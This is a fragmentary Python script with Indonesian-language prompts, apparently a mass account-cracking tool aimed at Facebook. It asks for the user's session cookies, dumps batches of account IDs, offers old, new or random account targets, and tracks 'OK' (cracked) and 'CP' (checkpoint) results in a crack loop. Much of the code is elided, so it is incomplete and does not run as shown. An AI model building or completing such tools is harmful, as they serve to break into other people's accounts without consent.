...
def login_lagi334():
	try:
		...
		os.system('clear')
		banner()
		cookie=input(f'  [{H}?{P}] MASUK COOKIES SAYANGðŸ˜˜ :{H} ')
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input(f'{m}➪ Mau Berapa ID ? : '))
	except ValueError:
		print('➪ Masukkan Angka, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print(f'{b}➪ Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
...
def setting():
	print(f'{m}➪ 1. Akun tua')
	print(f'{k}➪ 2. Akun New ')
	print(f'{h}➪ 3. Random ')
	print('')
	hu = input(f'{b}➪ Pilih : ')
	if hu in ['1','01']:
...
def passwrd():
	print('')
	print(f'{m}➪ Hasil {m}OK{m} Tersimpan Di : {m}OK/%s {m}'%(okc))
	print(f'{p}➪ Hasil {p}CP{p} Tersimpan Di : {p}CP/%s {p}'%(cpc))
	...
	print('')
	print(f'{m}➪ Lanjut Crack Kembali ( Y/t ) ? ')
	woi = input(f'{b}➪ Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}➪ PRIBADI {P}[{b}{loop}{P}/{m}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{K}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
